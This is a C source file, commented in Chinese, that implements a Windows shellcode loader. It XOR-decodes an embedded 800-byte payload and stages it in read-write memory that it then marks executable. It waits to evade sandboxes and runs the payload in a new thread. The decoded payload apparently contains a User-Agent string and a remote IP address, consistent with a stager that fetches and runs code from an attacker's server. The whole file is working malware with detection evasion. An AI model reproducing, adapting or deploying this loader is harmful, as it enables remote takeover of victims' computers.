#include <Windows.h>
#include <intrin.h>
#include <WinBase.h>
#include <stdio.h>
// 入口函数
int wmain(int argc,TCHAR * argv[]){

	int shellcode_size = 0; // shellcode长度
	DWORD dwThreadId; // 线程ID
	HANDLE hThread; // 线程句柄
	DWORD dwOldProtect; // 内存页属性
/* length: 800 bytes */

char buf[] = "\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x4a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x47\x6f\x39\x7d\x0a\x8e\x09\x65\x68\xe3\x93\x64\x44\x66\xec\xb8\x04\x0a\x84\x9f\x3f\x21\xc7\x08\x90\x78\xa4\xd5\xe6\x20\x22\x05\x2a\x38\xe7\xa4\xeb\xec\x92\xdf\xdd\x98\xf9\x94\x21\x5e\x76\xbd\x1d\xb9\xfd\xcc\x53\x21\x92\xcd\xb0\x50\x73\x68\x92\xe2\x09\x7f\x86\xff\xe0\x6d\x15\x91\x16\xb1\xee\x0a\x01\x09\x7a\x4a\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5d\x63\x64\x3c\x3e\x31\x2a\x72\x3c\x3e\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x47\x4b\x4b\x5f\x31\x2a\x44\x5a\x3a\x32\x23\x07\x00\x0a\x7e\x37\xc7\x11\xb8\xc7\xd1\x1a\x7f\x77\x3d\x36\x97\xf9\x86\x2f\xa2\xf1\x8b\xd1\x62\xc4\x39\x3a\xbc\x22\x88\xa0\x7c\x29\xb8\x43\x36\x0f\x1f\x27\x44\x9c\x17\xf2\xb9\xb1\xb5\x10\xa5\x8e\xb9\x3f\x72\xe9\x54\x7e\xd8\xdc\x01\x3f\xcb\xeb\x9d\x93\xfb\x0d\x75\xcf\xe3\x40\x6c\x5f\xa6\x5c\x65\xe8\xca\xde\x38\x10\x4a\xa0\x0d\x7d\x6a\xbb\xd2\x32\x54\xa6\xea\x2c\xc4\x4a\xc6\x5d\x81\x5d\xba\xff\x8e\x13\x7c\xb2\x10\x52\xf9\xc2\xb2\x41\xa9\xf2\xa6\x18\xd2\xb3\xd3\x25\xf7\x43\x2b\xba\xb6\x02\x1b\x44\xb8\x2e\x72\xf6\x57\x6b\xb9\x0b\x07\x20\x6c\xec\x11\x2d\x83\xbd\x73\xd3\xc5\x0d\xe7\x8c\x37\xbc\xce\x43\x51\x51\x73\xdd\x27\xd4\xd4\x04\x0c\x76\x6b\x55\xb7\xb1\x6e\x5c\xec\x21\xf8\x92\xda\x00\x40\x9c\xd8\xab\x78\x3e\x0c\x17\x68\xf1\x24\x9a\xba\xe4\xab\x38\x30\x2b\xee\xbd\x73\x45\x0f\x26\x09\xa2\x7f\xbf\xb6\x45\xd0\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x33\x3e\x24\x3b\x33\x3b\x24\x38\x3c\x24\x3b\x3e\x39\x0a\x31\x65\xbd\x30";


// 获取shellcode大小
shellcode_size = sizeof(buf);

/* 增加异或代码 */
for(int i = 0;i<shellcode_size; i++){
	Sleep(50);
	_InterlockedXor8(buf+i,10);
}
/*
VirtualAlloc(
	NULL, // 基址
	800,  // 大小
	MEM_COMMIT, // 内存页状态
	PAGE_EXECUTE_READWRITE // 可读可写可执行
	);
*/

char * shellcode = (char *)VirtualAlloc(
	NULL,
	shellcode_size,
	MEM_COMMIT,
	PAGE_READWRITE // 只申请可读可写
	);

	// 将shellcode复制到可读可写的内存页中
CopyMemory(shellcode,buf,shellcode_size);

// 这里开始更改它的属性为可执行
VirtualProtect(shellcode,shellcode_size,PAGE_EXECUTE,&dwOldProtect);

// 等待几秒，兴许可以跳过某些沙盒呢？
Sleep(2000);

hThread = CreateThread(
	NULL, // 安全描述符
	NULL, // 栈的大小
	(LPTHREAD_START_ROUTINE)shellcode, // 函数
	NULL, // 参数
	NULL, // 线程标志
	&dwThreadId // 线程ID
	);

WaitForSingleObject(hThread,INFINITE); // 一直等待线程执行结束
	return 0;
}
